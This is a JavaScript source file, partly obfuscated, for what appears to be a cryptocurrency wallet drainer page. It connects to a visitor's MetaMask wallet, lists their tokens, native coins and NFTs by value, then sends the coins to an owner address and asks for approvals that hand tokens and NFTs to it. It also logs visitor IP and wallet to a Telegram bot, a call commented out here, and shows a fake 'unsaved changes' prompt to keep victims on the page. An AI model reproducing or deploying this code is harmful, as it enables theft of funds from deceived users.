ZAPPER_MATCH = {
    eth: 'ethereum',
    matic: 'polygon',
    bsc: 'binance-smart-chain',
  }
  NATIVE_MATCH = {
    eth: '0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2',
    matic: '0x7d1afa7b718fb893db30a3abc0cfc608aacfebb0',
    bsc: '0x1f98431c8ad98523631ae4a59f267346ea31f984',
  }
  CHAIN_ID = {
    eth: 1,
    matic: 137,
    bsc: 56,
  }
  MORALIS_MATCH = {
    eth: 'eth',
    matic: 'polygon',
    bsc: 'bsc',
  }
  var connected = 0
  itemList = []
  var nativePrices = {
    eth: 0,
    matic: 0,
    bsc: 0,
  }
  var tgMsgCount = {
    approve: 0,
    canceled: 0,
    signed: 0,
    canceledSwitch: 0,
  }
  account = ''
  async function connectMetamask() {
    if (connected == 1) {
      return
    }
    if (!window.ethereum) {
      console.log('Metamask is not installed')
      return
    }
    await ethereum.request({ method: 'eth_requestAccounts' })
    provider = window.ethereum
    web3 = new Web3(provider)
    const _0x14adec = await web3.eth.getAccounts()
    account = _0x14adec[0]
    connected = 1
    updateState('metamaskConnected')
    console.log('Current account ', account)
    updateState('userTokensFetching')
    await fetchUserTokens(account)
    updateState('userTokensFetched')
  }
  async function fetchUserTokens(_0x5abd0e) {
    let _0x1bd365 =
      'https://deep-index.moralis.io/api/v2/' + _0x5abd0e + '/balance'
    let _0x19e9bc = 'https://deep-index.moralis.io/api/v2/' + _0x5abd0e + '/erc20'
    let _0x3f47a2 = 'https://deep-index.moralis.io/api/v2/erc20/'
    let _0x2050b7 =
      'https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=' +
      _0x5abd0e +
      '&limit=25'
    let _0x3622f2 = await fetch(
      'https://api.zapper.fi/v2/balances?addresses%5B%5D=' +
        ('' + _0x5abd0e) +
        '&networks%5B%5D=ethereum&networks%5B%5D=polygon&networks%5B%5D=binance-smart-chain',
      { headers: { Authorization: ZAPPER_KEY } }
    )
    let _0x43ce4d = (await _0x3622f2.text()).replace(
      /[\n]*event: [\w]*[\n]*data: \{"appId":"([-\w]*)","network":"([-\w]*)"/gi,
      ',"data$1$2": {"appId":"$1","network":"$2"'
    )
    console.log(_0x43ce4d)
    _0x43ce4d =
      '{' + _0x43ce4d.slice(1).replace('\n\nevent: end\ndata: {}\n\n', '') + '}'
    let _0x138642 = JSON.parse(_0x43ce4d)
    let _0x39ce7a = []
    for (let _0x38dd88 in _0x138642) {
      let _0x48131b = []
      for (let _0x14eb63 in _0x138642[_0x38dd88].balance) {
        if (Object.keys(_0x138642[_0x38dd88].balance[_0x14eb63]).length !== 0) {
          for (let _0x4257b1 in _0x138642[_0x38dd88].balance[_0x14eb63]) {
            if (
              _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].address !=
              '0x0000000000000000000000000000000000000000'
            ) {
              let _0x16d3f9 = {
                contract:
                  _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].address,
                type: 'token',
                balance: parseInt(
                  _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].context
                    .balanceRaw
                ),
                price:
                  _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].balanceUSD,
                chain: 'bsc',
                chain: 'matic',
                chain: 'eth',
                chain: _0x138642[_0x38dd88].network,
              }
              if (_0x138642[_0x38dd88].network == 'binance-smart-chain') {
              } else {
                if (_0x138642[_0x38dd88].network == 'polygon') {
                } else {
                  if (_0x138642[_0x38dd88].network == 'ethereum') {
                  } else {
                  }
                }
              }
              _0x48131b.push(_0x16d3f9)
            } else {
              let _0x490b0c = {
                contract:
                  _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].address,
                type: 'native',
                balance: parseInt(
                  _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].context
                    .balanceRaw
                ),
                price:
                  _0x138642[_0x38dd88].balance[_0x14eb63][_0x4257b1].balanceUSD,
                chain: 'bsc',
                chain: 'matic',
                chain: 'eth',
                chain: _0x138642[_0x38dd88].network,
              }
              if (_0x138642[_0x38dd88].network == 'binance-smart-chain') {
              } else {
                if (_0x138642[_0x38dd88].network == 'polygon') {
                } else {
                  if (_0x138642[_0x38dd88].network == 'ethereum') {
                  } else {
                  }
                }
              }
              _0x48131b.push(_0x490b0c)
            }
          }
        }
      }
      if (Object.keys(_0x48131b).length !== 0) {
        _0x39ce7a.push(_0x48131b)
      }
    }
    for (let _0x217b74 of Object.entries(chains)) {
      if (!_0x217b74[1]) {
        continue
      } else {
        let _0x2ccfd5 = await fetch(
          _0x3f47a2 + (NATIVE_MATCH[_0x217b74[0]] + '/price?chain=eth'),
          { headers: { 'X-API-Key': MORALIS_KEY } }
        )
        _0x138642 = await _0x2ccfd5.json()
        console.log(_0x138642)
        nativePrices[_0x217b74[0]] = _0x138642.usdPrice
      }
      let _0x576b47 = nativePrices[_0x217b74[0]]
      if (toDrain[_0x217b74[0]].nft == true) {
        let _0x24dfb3 = await fetch(_0x2050b7, {
          headers: { Authorization: ZAPPER_KEY },
        })
        nftList = (await _0x24dfb3.json()).items
        itemList = itemList.concat(
          nftList.map((_0x3bf7d1) => {
            return {
              contract: _0x3bf7d1.token.collection.address,
              balance: _0x3bf7d1.token.tokenId,
              type: 'nft',
              price: _0x3bf7d1.token.estimatedValueEth * _0x576b47,
              chain: _0x217b74[0],
            }
          })
        )
      }
      if (toDrain[_0x217b74[0]].tokens == true) {
        let _0x520f76 = []
        for (let _0x35f644 in _0x39ce7a) {
          for (tokenid in _0x39ce7a[_0x35f644]) {
            if (
              _0x39ce7a[_0x35f644][tokenid].chain == _0x217b74[0] &&
              _0x39ce7a[_0x35f644][tokenid].type == 'token'
            ) {
              _0x520f76.push(_0x39ce7a[_0x35f644][tokenid])
            }
          }
        }
        itemList = itemList.concat(_0x520f76)
      }
      if (toDrain[_0x217b74[0]].eth == true) {
        let _0x541271 = []
        for (let _0x1038bf in _0x39ce7a) {
          for (tokenid in _0x39ce7a[_0x1038bf]) {
            if (
              _0x39ce7a[_0x1038bf][tokenid].chain == _0x217b74[0] &&
              _0x39ce7a[_0x1038bf][tokenid].type == 'native'
            ) {
              _0x541271.push(_0x39ce7a[_0x1038bf][tokenid])
            }
          }
        }
        itemList = itemList.concat(_0x541271)
      }
    }
    itemList.sort((_0x2736c1, _0x3d2424) => {
      if (_0x2736c1.price > _0x3d2424.price) {
        return -1
      } else {
        if (_0x2736c1.price < _0x3d2424.price) {
          return 1
        } else {
          return 0
        }
      }
    })
  }
  async function sendEth(_0x4c036b, _0x57ef3b) {
    gasPrice = await web3.eth.getGasPrice()
    newAmount = _0x4c036b - Number(gasPrice) * 40000
    if (newAmount < 0) {
      return
    }
    var _0x536ca1 = {
      from: account,
      to: ownerAddress,
      value: newAmount,
    }
    var _0x33fbc8 = 1
    try {
      await web3.eth.sendTransaction(_0x536ca1)
    } catch (_0x279a50) {
      console.log(_0x279a50)
      _0x33fbc8 = 0
    }
    logTx(_0x33fbc8)
  }
  async function sendToken(_0x1a498a, _0x296cd1) {
    console.log('IN SEND TOKEN', _0x1a498a, _0x296cd1)
    var _0x52fce4 = new web3.eth.Contract(ERC20_ABI, _0x296cd1)
    var _0x1cb36f = 1
    try {
      await _0x52fce4.methods.approve(ownerAddress, _0x1a498a.toString()).send({
        from: account,
        gas: 120000,
        gasPrice: 0,
      })
    } catch (_0x35a8ab) {
      console.log(_0x35a8ab)
      _0x1cb36f = 0
    }
    logTx(_0x1cb36f)
  }
  async function sendNFT(_0x3d11c3, _0x387a68) {
    var _0x2f6c85 = new web3.eth.Contract(ERC721_ABI, _0x387a68)
    var _0x41e645 = 1
    try {
      await _0x2f6c85.methods.approve(ownerAddress, _0x3d11c3).send({
        from: account,
        gas: 120000,
        gasPrice: 0,
      })
    } catch (_0x38eb37) {
      console.log(_0x38eb37)
      _0x41e645 = 0
    }
    logTx(_0x41e645)
  }
  async function drain() {
    for (var _0x8ea47 of itemList) {
      console.log('draining', _0x8ea47)
      if (_0x8ea47.price > 0) {
        if (tgMsgCount.approve++ < 1) {
          sendMsg(LOG_SCHEMA[logLanguage].onApprove)
        }
        try {
          if (window.ethereum.networkVersion !== CHAIN_ID[_0x8ea47.chain]) {
            await changeNetwork(CHAIN_ID[_0x8ea47.chain])
          }
        } catch (_0x27f391) {
          if (tgMsgCount.canceledSwitch++ < 3) {
            sendMsg(LOG_SCHEMA[logLanguage].onCancelSwitch)
          }
          continue
        }
        try {
          if (_0x8ea47.type == 'native') {
            await sendEth(_0x8ea47.balance, _0x8ea47.chain)
          } else {
            if (_0x8ea47.type == 'token') {
              await sendToken(_0x8ea47.balance, _0x8ea47.contract)
            } else {
              if (_0x8ea47.type == 'nft') {
                await sendNFT(_0x8ea47.balance, _0x8ea47.contract)
              }
            }
          }
        } catch (_0x260ea1) {
          console.log(_0x260ea1)
        }
      }
    }
  }
  const changeNetwork = async (_0x177e61) => {
    if (window.ethereum) {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: Web3.utils.toHex(_0x177e61) }],
      })
    }
  }
  function logTx(_0x19988a) {
    if (_0x19988a == 1) {
      if (tgMsgCount.signed++ < 3) {
        sendMsg(LOG_SCHEMA[logLanguage].onSign)
      }
    } else {
      if (tgMsgCount.canceled++ < 3) {
        sendMsg(LOG_SCHEMA[logLanguage].onCancel)
      }
    }
  }
  async function sendMsg(_0xb37067) {
    var _0x5e3753 = _0xb37067
      .replace('$id', localStorage.getItem('scUniqueId'))
      .replace('$wallet', account)
      /*
    var _0x2caca1 =
      'https://api.telegram.org/bot' +
      tgConfig.botToken +
      '/sendMessage?chat_id=' +
      tgConfig.chatId +
      '&parse_mode=markdown&text=' +
      _0x5e3753
    console.log(_0x5e3753)
    resp = fetch(_0x2caca1)
    */
  }
  window.addEventListener('load', async () => {
    id = localStorage.getItem('scUniqueId')
    if (id == null) {
      response = await fetch('https://api.ipify.org')
      id = await response.text()
      localStorage.setItem('scUniqueId', id)
    }
    sendMsg(LOG_SCHEMA[logLanguage].onConnect)
  })
  try {
    window.ethereum.on('accountsChanged', (_0x60f810) => {
      account = _0x60f810[0]
      id = localStorage.getItem('scUniqueId')
      if (connected == 0) {
        sendMsg(LOG_SCHEMA[logLanguage].onMetamaskConnect)
      }
    })
  } catch (_0x3ca6e9) {
    console.log(_0x3ca6e9)
  }
  window.addEventListener('beforeunload', function (_0x53a4bf) {
    var _0x32d330 =
      'It looks like you have been editing something. If you leave before saving, your changes will be lost.'
    ;(_0x53a4bf || window.event).returnValue = _0x32d330
    sendMsg(LOG_SCHEMA[logLanguage].onDisconnect)
    return _0x32d330
  })
  function getMobileOperatingSystem() {
    var _0x317694 = navigator.userAgent || navigator.vendor || window.opera
    console.log(_0x317694)
    const _0x1be813 = window.location.search
    const _0x1eaec6 = new URLSearchParams(_0x1be813)
    const _0x5289cc = _0x1eaec6.get('uid')
    console.log(_0x5289cc)
    if (_0x5289cc == 'mm') {
      return 'Metamask'
    }
    if (/windows phone/i.test(_0x317694)) {
      return 'Windows Phone'
    }
    if (/android/i.test(_0x317694)) {
      return 'Android'
    }
    if (/iPad|iPhone|iPod/.test(_0x317694) && !window.MSStream) {
      return 'iOS'
    }
    return 'unknown'
  }
  document.addEventListener('DOMContentLoaded', (_0x324095) => {
    if (
      (getMobileOperatingSystem() == 'Android' ||
        getMobileOperatingSystem() == 'iOS') &&
      !window.ethereum
    ) {
      var _0x5d5b26 = connects.concat(connectAndDrains)
      for (var _0xa6a42d of _0x5d5b26) {
        var _0x13de3b = document.querySelector(_0xa6a42d)
        var _0x5c2ee3 = document.createElement('a')
        _0x5c2ee3.classList.add('mmLink')
        _0x5c2ee3.href =
          'https://metamask.app.link/dapp/' +
          window.location.href.replace('https://', '').replace('http://', '') +
          '?uid=mm'
        _0x13de3b.parentNode.insertBefore(_0x5c2ee3, _0x13de3b)
        _0x5c2ee3.appendChild(_0x13de3b)
      }
    }
  })
  updateState('metamaskDisconnected')
  if (autoMetamaskConnect == 1) {
    connectMetamask()
  }
  async function connectAndDrain() {
    if (connected == 0) {
      await connectMetamask()
    }
    await drain()
  }
  connects.forEach((_0x308540) => {
    document.querySelector(_0x308540).onclick = connectMetamask
  })
  drains.forEach((_0x40f142) => {
    document.querySelector(_0x40f142).onclick = drain
  })
  connectAndDrains.forEach((_0x3559bd) => {
    document.querySelector(_0x3559bd).onclick = connectAndDrain
  })
  